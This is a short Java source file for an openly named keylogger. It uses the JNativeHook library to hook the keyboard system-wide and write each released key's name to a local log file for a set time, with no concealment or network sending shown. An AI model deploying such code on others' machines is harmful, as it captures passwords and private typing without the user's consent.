package com.util;

import java.io.BufferedOutputStream;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.security.Key;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger {
    private static KeyLogger instance = new KeyLogger();
    public Boolean isLogging = false;

    private KeyLogger() { //Constructor for Keylogger

    }

    public static KeyLogger getInstance() {
        return instance;
    }

    public void startLog(String filename, long time) throws IOException {
        FileWriter writer = new FileWriter(filename,false);
        GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
            @Override
            public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
                try {
                    writer.write(NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));
                    writer.write(" ");
                    writer.flush();
                } catch (IOException e) {
                    System.out.println("Error when logging");
                    e.printStackTrace();
                }
            }
        });

        try {
            System.out.println("StartLog");
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.out.println("Cannot logging");
            e.printStackTrace();
        }
        var pool = Executors.newScheduledThreadPool(1);
        var a = pool.schedule(() -> {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException e) {
                throw new RuntimeException(e);
            }
        }, time, TimeUnit.MILLISECONDS);
        try {
            a.get();
        } catch (InterruptedException | ExecutionException e) {
            System.out.println("Cannot stop log");
            e.printStackTrace();
        } finally {
            pool.shutdown();
            writer.close();
        }
    }


    public static void main(String[] args) {
        try {
            KeyLogger.getInstance().startLog("log.txt", 10000);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
 }
}
